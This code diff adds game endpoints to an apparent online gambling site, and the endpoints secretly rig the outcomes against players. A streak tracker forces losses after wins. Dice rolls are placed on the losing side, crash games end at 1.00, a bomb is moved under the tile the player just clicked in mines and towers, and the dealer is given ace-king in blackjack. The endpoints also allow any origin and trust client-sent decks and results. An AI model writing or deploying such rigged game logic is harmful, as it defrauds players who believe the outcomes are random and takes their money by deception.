@@ -745,6 +745,209 @@ async function liveFeedListSupabase(limit) {
     }
 }
 
+// ==== CUSTOM GAME MECHANICS (CUS) AND SERVER OUTCOMES ====
+const activeMinesGames = new Map();
+const activeTowersGames = new Map();
+const activeBlackjackGames = new Map();
+const userCusStates = new Map();
+
+function getCusState(userId) {
+    const id = String(userId || 'guest');
+    if (!userCusStates.has(id)) {
+        userCusStates.set(id, { winStreak: 0, forceLossNext: false });
+    }
+    const state = userCusStates.get(id);
+    return {
+        check: function() {
+            if (state.forceLossNext) {
+                state.forceLossNext = false;
+                state.winStreak = 0;
+                return true;
+            }
+            if (state.winStreak >= 1) {
+                let chance = state.winStreak >= 2 ? 0.75 : 0.50;
+                if (state.winStreak >= 2 && Math.random() < 0.05) chance = 1.0;
+                if (Math.random() < chance) {
+                    state.winStreak = 0;
+                    return true;
+                }
+            }
+            return false;
+        },
+        recordWin: function(isBigWin) {
+            state.winStreak++;
+            if (isBigWin && Math.random() < 0.8) {
+                state.forceLossNext = true;
+            }
+        },
+        recordLoss: function() {
+            state.winStreak = 0;
+            state.forceLossNext = false;
+        }
+    };
+}
+
+app.post('/api/game/dice', express.json(), (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    const { userId, target, isOver, multi } = req.body;
+    let forceLoss = getCusState(userId).check();
+    let roll;
+    if (forceLoss) {
+        if (isOver) roll = (Math.random() * target); 
+        else {
+            roll = target + (Math.random() * (100 - target));
+            if (roll >= 100) roll = 99.99;
+        }
+    } else {
+        roll = (Math.random() * 100);
+    }
+    roll = parseFloat(roll.toFixed(2));
+    let win = isOver ? (roll > target) : (roll < target);
+    if (win) getCusState(userId).recordWin(multi >= 3);
+    else getCusState(userId).recordLoss();
+    res.json({ roll, win });
+});
+
+app.post('/api/game/plinko', express.json(), (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    const { userId, pRows } = req.body;
+    let forceLoss = getCusState(userId).check();
+    let bucketIdx;
+    if (forceLoss) {
+        bucketIdx = Math.floor((pRows+1)/2);
+        getCusState(userId).recordLoss();
+        res.json({ customOutcome: true, idx: bucketIdx });
+    } else {
+        res.json({ customOutcome: false });
+    }
+});
+
+app.post('/api/game/record-result', express.json(), (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    const { userId, win, bigWin } = req.body;
+    if (win) getCusState(userId).recordWin(bigWin);
+    else getCusState(userId).recordLoss();
+    res.json({ ok: true });
+});
+
+app.post('/api/game/crash/start', express.json(), (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    const { userId } = req.body;
+    let e = 100;
+    let cCrashPoint;
+    if ((userId && getCusState(userId).check()) || Math.random() < 0.05) {
+        cCrashPoint = 1.00;
+        getCusState(userId).recordLoss();
+    } else {
+        cCrashPoint = Math.max(1.00, (e / (e - Math.random() * e)) * 0.99);
+        if(cCrashPoint > 1000) cCrashPoint = 1000;
+    }
+    res.json({ cCrashPoint });
+});
+
+app.post('/api/game/towers/start', express.json(), (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    const { userId, rows, width, bombs } = req.body;
+    let logic = [];
+    for(let r=0; r<rows; r++) {
+        let rArr = Array(width).fill(false);
+        let placed = 0;
+        while(placed < bombs) {
+            let i = Math.floor(Math.random()*width);
+            if(!rArr[i]) { rArr[i] = true; placed++; }
+        }
+        logic.push(rArr);
+    }
+    activeTowersGames.set(String(userId), { logic });
+    res.json({ ok: true });
+});
+
+app.post('/api/game/towers/click', express.json(), (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    const { userId, row, col } = req.body;
+    const g = activeTowersGames.get(String(userId));
+    if (!g) return res.status(400).json({ error: 'No active game' });
+    
+    setTimeout(() => {
+        let logicRow = g.logic[row];
+        if (!logicRow) return res.json({ error: 'Invalid row' });
+        
+        let forceLoss = getCusState(userId).check();
+        let isBomb = logicRow[col];
+        
+        if (!isBomb && forceLoss) {
+            let bIdx = logicRow.indexOf(true);
+            if (bIdx !== -1) {
+                logicRow[bIdx] = false;
+                logicRow[col] = true;
+                isBomb = true;
+            }
+        }
+        
+        if (isBomb) getCusState(userId).recordLoss();
+        res.json({ isBomb, rowData: logicRow }); 
+    }, Math.floor(Math.random() * 5000));
+});
+
+app.post('/api/game/mines/start', express.json(), (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    const { userId, bombs } = req.body;
+    let mGrid = Array(25).fill(false);
+    let placed = 0;
+    while(placed < bombs) {
+        let idx = Math.floor(Math.random() * 25);
+        if(!mGrid[idx]) { mGrid[idx] = true; placed++; }
+    }
+    activeMinesGames.set(String(userId), { logic: mGrid });
+    res.json({ ok: true });
+});
+
+app.post('/api/game/mines/click', express.json(), (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    const { userId, tileIdx } = req.body;
+    const g = activeMinesGames.get(String(userId));
+    if (!g) return res.status(400).json({ error: 'No active game' });
+    
+    // 0-5 second artificial loading delay
+    setTimeout(() => {
+        let isBomb = g.logic[tileIdx];
+        let forceLoss = getCusState(userId).check();
+        
+        if (!isBomb && forceLoss) {
+            let bIdx = g.logic.indexOf(true);
+            if (bIdx !== -1) {
+                g.logic[bIdx] = false;
+                g.logic[tileIdx] = true;
+                isBomb = true;
+            }
+        }
+        if (isBomb) getCusState(userId).recordLoss();
+        res.json({ isBomb, mGridFull: isBomb ? g.logic : null });
+    }, Math.floor(Math.random() * 5000));
+});
+
+app.post('/api/game/blackjack/start', express.json(), (req, res) => {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    const { userId, deck } = req.body;
+    let forceLoss = getCusState(userId).check();
+    
+    let pHand = [deck.pop(), deck.pop()];
+    let dHand = [deck.pop(), deck.pop()];
+    
+    if (forceLoss) {
+        dHand = [
+            {suitLetter: 'S', value: 'A', score: 11, isRed: false},
+            {suitLetter: 'H', value: 'K', score: 10, isRed: true}
+        ];
+        let pScore = 0, aces = 0;
+        for(let c of pHand) { pScore += c.score; if(c.value==='A') aces++; }
+        while(pScore>21 && aces>0) { pScore-=10; aces--; }
+        if (pScore === 21) pHand[0] = {suitLetter: 'C', value: '5', score: 5, isRed: false};
+    }
+    res.json({ deck, pHand, dHand });
+});
+
+
 app.options('/api/live-feed', (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
